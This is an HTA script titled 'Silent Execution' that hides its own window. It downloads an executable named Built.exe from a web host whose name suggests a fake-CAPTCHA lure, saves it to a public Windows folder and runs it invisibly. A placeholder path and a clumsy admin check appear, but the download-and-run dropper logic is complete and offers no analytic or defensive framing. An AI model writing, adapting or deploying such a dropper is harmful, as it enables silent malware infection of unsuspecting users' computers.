<!DOCTYPE html>
<html>
<head>
    <title>Silent Execution</title>
    <hta:application 
        id="silentApp"
        border="none"
        sysmenu="no"
        caption="no"
        maximizeButton="no"
        minimizeButton="no"
        showInTaskbar="no"
        windowState="hidden"
        scroll="no"
    />
</head>
<body>
    <script language="VBScript">
        ' Check if script is running with admin privileges
        Set objShell = CreateObject("WScript.Shell")
        If Not IsAdmin() Then
            objShell.Run "mshta.exe ""javascript:var shell = new ActiveXObject('WScript.Shell'); shell.Run('mshta.exe ""path_to_your_htafile.hta""', 0, true);window.close();""", 1, True
            WScript.Quit
        End If
        
        ' Function to check if the script is running as Admin
        Function IsAdmin()
            On Error Resume Next
            Set objShell = CreateObject("WScript.Shell")
            objShell.Exec("net session")
            If Err.Number = 0 Then
                IsAdmin = True
            Else
                IsAdmin = False
            End If
            On Error GoTo 0
        End Function
        
        ' Create a VBScript to download and execute Built.exe silently
        Set objXMLHttp = CreateObject("MSXML2.XMLHTTP")
        Set objStream = CreateObject("ADODB.Stream")
        
        ' URL of the file to download
        fileURL = "https://notafakecaptica2222.vercel.app/Built.exe"
        
        ' Path to save the file temporarily
        tempFilePath = "C:\Users\Public\Built.exe"
        
        ' Download the file
        objXMLHttp.open "GET", fileURL, False
        objXMLHttp.send
        If objXMLHttp.Status = 200 Then
            objStream.Open
            objStream.Write objXMLHttp.responseBody
            objStream.SaveToFile tempFilePath, 2 ' 2 means overwrite the file if exists
            objStream.Close
        End If
        
        ' Run the downloaded EXE file silently
        Set WshShell = CreateObject("WScript.Shell")
        WshShell.Run Chr(34) & tempFilePath & Chr(34), 0, False ' 0 hides the window
    </script>
</body>
</html>
